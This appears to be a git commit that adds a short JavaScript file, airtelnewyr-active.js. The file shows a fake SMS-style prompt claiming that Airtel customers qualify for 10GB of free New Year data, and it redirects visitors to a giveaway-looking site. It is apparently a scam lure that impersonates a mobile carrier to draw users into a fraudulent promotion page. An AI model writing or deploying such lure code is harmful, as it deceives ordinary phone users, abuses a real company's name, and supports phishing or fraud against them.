cce41c2dd47cf93fe9977396c175e70472adeb7c
ukebeblog <esther001imoh@gmail.com>
2025-01-01 08:37:43 +0100

    Create airtelnewyr-active.js

---
+++ airtelnewyr-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE UNLIMITED DATA'
+password=prompt('SMS: Congratulations You are qualify for Airtel New Year 10GB 1-Months Unlimited Free Data , Kindly Press OK to Activate now   ','ACTIVATE UNLIMITED DATA');
+if (password != 'ACTIVATE UNLIMITED DATA') {
+location.href='https://newyr-gift.org/airtel-newyr.html';
+}
